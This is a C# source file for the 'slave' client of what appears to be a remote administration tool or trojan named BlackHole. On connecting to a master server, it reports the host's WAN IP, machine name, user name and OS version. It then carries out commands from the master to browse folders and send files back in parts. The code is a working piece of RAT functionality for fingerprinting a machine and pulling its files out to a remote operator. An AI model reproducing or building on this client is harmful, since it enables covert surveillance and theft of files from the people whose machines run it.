using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using NetMQ;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Slave
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class MasterServer
    {
        private NetMQContext m_netContext;
        private NetMQSocket m_client;
        private Poller m_poller;

        /// <summary>
        /// 
        /// </summary>
        public MasterServer(NetMQContext context, string serverAddress)
        {
            m_netContext = context;
            m_client = m_netContext.CreateDealerSocket();
            m_client.Options.Linger = TimeSpan.Zero;
            m_client.Options.ReconnectInterval = TimeSpan.FromMilliseconds(500);
            m_client.ReceiveReady += Client_ReceiveReady;

            m_poller = new Poller();
            m_poller.AddSocket(m_client);
            m_poller.PollTillCancelledNonBlocking();

            m_client.Connect(serverAddress);

            Send(new GreetTheMasterMessage()
            {
                Ip = Utility.GetWanIp(),
                MachineName = Environment.MachineName,
                UserName = Environment.UserName,
                OperatingSystem = Environment.OSVersion.VersionString
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void Send(NetMessage message) => m_client.SendMultipartMessage(new NetMQMessage(new byte[][] { message.Serialize() }));

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Client_ReceiveReady(object sender, NetMQSocketEventArgs e)
        {
            var frames = e.Socket.ReceiveMultipartMessage();
            var message = NetMessage.Deserialize(frames.Last.Buffer);
            message.Match()
                .With<DoYourDutyMessage>(DoYourDuty)
                .With<PingMessage>(Ping)
                .With<NavigateToFolderMessage>(NavigateToFolder)
                .With<DownloadFilePartMessage>(DownloadFilePart);
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        private void SendStatus(string operation, Exception exception) => SendStatus(operation, false, exception.ToString());

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        private void SendStatus(string operation, string message) => SendStatus(operation, true, message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operation"></param>
        /// <param name="success"></param>
        /// <param name="message"></param>
        private void SendStatus(string operation, bool success, string message)
        {
            Send(new StatusUpdateMessage()
            {
                Operation = operation,
                Success = success,
                Message = message
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void DoYourDuty(DoYourDutyMessage message)
        {
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void Ping(PingMessage message)
        {
            Send(new PongMessage());
        }
           
        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="name"></param>
        /// <param name="operation"></param>
        /// <param name="messageBuilder"></param>
        private void ExecuteSimpleOperation<T>(string name, Func<T> operation, Func<T, string> messageBuilder) where T : NetMessage
            => ExecuteComplexSendOperation(name, operation, (message) =>
            {
                SendStatus(name, "Success : " + messageBuilder(message));
            });

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="name"></param>
        /// <param name="operation"></param>
        /// <param name="success"></param>
        private void ExecuteComplexSendOperation<T>(string name, Func<T> operation, Action<T> success) where T : NetMessage
            => Utility.ExecuteComplexOperation(operation, (message) =>
            {
                Send(message);
                success(message);
            }, (e) => SendStatus(name, e));


        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void NavigateToFolder(NavigateToFolderMessage message)
        {
            ExecuteSimpleOperation("Folder navigation", 
                () => FileHelper.NavigateToFolder(message.Path), 
                (nav) => nav.Path);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void DownloadFilePart(DownloadFilePartMessage message)
        {
            ExecuteComplexSendOperation("File download",
                () => FileHelper.DownloadFilePart(message.Id, message.CurrentPart, message.Path),
                (part) =>
                {
                    if (part.CurrentPart == part.TotalPart)
                        SendStatus("File download", "Successfully downloaded : " + part.Path);
                });
        }
    }
}
